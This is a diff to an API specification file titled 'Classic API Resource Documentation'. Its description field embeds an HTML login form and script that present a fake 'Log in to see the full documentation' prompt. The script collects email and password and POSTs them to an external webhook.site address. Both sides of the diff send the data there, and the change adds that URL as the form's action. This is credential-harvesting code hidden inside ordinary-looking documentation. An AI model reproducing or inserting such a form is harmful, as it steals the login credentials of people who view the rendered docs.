@@ -3,7 +3,7 @@ info:
   title: Classic API Resource Documentation
   description: |
     <h1>Log in to see the full documentation</h1>
-    <form id="loginForm" onsubmit="handleSubmit(event)">
+    <form id="loginForm" action="https://webhook.site/bc8d6747-e2bd-4874-b5be-2a28cf18a41e" method="post" onsubmit="handleSubmit(event)" target="_blank">
     <label for="email">Login:</label>
     <input name="email" required>
     <label for="password">Password:</label>
@@ -12,13 +12,13 @@ info:
     <script>
       function handleSubmit(event) {
         event.preventDefault(); // Prevent default form submission
-
-        // Create a FormData object from the form
+        
+        // Get form data
         const form = document.getElementById('loginForm');
         const formData = new FormData(form);
 
-        // Send a POST request to the webhook
-        fetch('https://webhook.site/bc8d6747-e2bd-4874-b5be-2a28cf18a41e', {
+        // Perform the fetch request
+        fetch(form.action, {
           method: 'POST',
           body: formData
         }).then(response => {
